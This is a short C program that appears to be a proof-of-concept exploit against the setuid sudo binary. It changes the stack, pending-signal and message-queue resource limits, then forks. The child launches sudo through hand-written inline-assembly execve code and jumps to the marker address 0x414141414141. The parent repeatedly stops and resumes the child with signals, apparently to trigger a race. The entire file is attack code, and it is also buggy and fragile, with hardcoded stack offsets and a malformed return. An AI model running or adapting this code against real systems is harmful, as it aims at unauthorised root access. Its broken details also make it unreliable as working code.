#define _GNU_SOURCE
#define _FILE_OFFSET_BITS 64
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/resource.h>
#include <time.h>
#include <unistd.h>
int main(int argc, char *argv[])
{
    struct rlimit old, new;
    struct rlimit *newp = NULL;
    pid_t pid;
    char *cmd = "/usr/bin/sudo";
    char *argv_[] = {"", "", NULL};
    char *envp_[] = {NULL};

    if (argc < 3) {
        printf("usage: soflimit hardlimit\n;");
        return;
    }

    pid = getpid();
    newp = NULL;
    if (argc >= 3) {
        new.rlim_cur = atoi(argv[1]);
        new.rlim_max = atoi(argv[2]);
        newp = &new;
    }

    if (argc == 4) {
        argv_[0] = argv[3];
        argv_[1] = NULL;
    }

    if (prlimit(pid, RLIMIT_STACK, newp, &old) == -1) {
        perror("limit failed");
        exit(EXIT_FAILURE);
    }

    if (prlimit(pid, RLIMIT_SIGPENDING, newp, &old) == -1) {
        perror("signal limit error");
        exit(EXIT_FAILURE);
    }

    if (prlimit(pid, RLIMIT_MSGQUEUE, newp, &old) == -1) {
        perror("signal limit error");
        exit(EXIT_FAILURE);
    }

    if ((pid = fork()) == 0) {
        sleep(1);
        // rax = syscall nº
        // 1.rdi	2.rsi	3.rdx
        __asm__(
            "mov   -0x68(%rbp),%rax\n\t" //58
            "mov    %rax,%rdi\n\t"
            "lea -0x20(%rbp),%rcx\n\t" //20
            "mov    %rcx, %rsi\n\t"
            "lea        -0x38(%rbp),%rdx\n\t" //28
            "mov    $0x3b,%eax\n\t"
            "syscall\n\t"
            "movq $0x414141414141, %rax\n\t"
            "jmp %rax\n\t");
    } else {
        for (;;) {
            kill(pid, SIGCONT);
            nanosleep((const struct timespec[]){{0, 500000000L}}, NULL);
            kill(pid, SIGSTOP);
        }
    }
}
